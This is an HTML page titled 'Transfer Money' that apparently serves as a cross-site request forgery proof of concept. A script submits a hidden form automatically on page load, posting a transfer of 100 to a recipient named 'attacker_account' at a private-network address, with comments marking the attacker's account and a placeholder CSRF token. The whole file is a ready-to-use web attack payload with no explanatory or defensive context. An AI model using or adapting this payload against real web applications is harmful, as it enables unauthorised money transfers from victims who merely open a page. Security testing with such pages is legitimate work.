<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer Money</title>
    <script>
        window.onload = function() {
            document.getElementById('transferForm').submit(); // Automatically submit the form when the page loads
        };
    </script>
</head>
<body>
    <h2>Transfer Money</h2>
    <form id="transferForm" action="https://192.168.2.199:64710/" method="POST">
        <input type="hidden" name="csrf_token" value="your_csrf_token_here"> <!-- Replace "your_csrf_token_here" with the actual CSRF token -->
        <div>
            <label for="recipient">Recipient:</label>
            <input type="text" id="recipient" name="recipient" value="attacker_account" required> <!-- Set default recipient to attacker's account -->
        </div>
        <div>
            <label for="amount">Amount:</label>
            <input type="number" id="amount" name="amount" min="0" step="0.01" value="100" required> <!-- Set default amount -->
        </div>
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
